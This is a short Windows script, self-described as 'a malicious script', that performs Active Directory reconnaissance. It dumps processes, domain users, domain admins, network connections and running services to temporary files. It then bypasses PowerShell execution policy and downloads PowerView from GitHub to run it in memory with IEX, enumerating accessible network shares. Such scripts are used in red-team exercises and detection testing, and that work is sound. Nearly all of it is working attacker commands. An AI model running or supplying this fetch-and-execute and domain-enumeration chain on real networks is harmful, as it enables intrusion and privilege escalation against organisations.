echo "Running a malicious script"
ps > c:\windows\temp\processlist.txt
net users /domain > c:\windows\temp\userlist.txt
net group "domain admins" /domain > c:\windows\temp\domain_admins.txt
netstat -an > c:\disk\established_connections.txt

Get-Service | Where-Object { $_.Status -eq 'Running' } > c:\w\services_running.txt

powershell.exe -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerView/powerview.ps1');Invoke-ShareFinder -CheckShareAccess|Out-File -FilePath c:\windows\temp\sharefinder.txt"
echo "Powershell script completed, see the c:\disk\sharefinder.txt"
pause

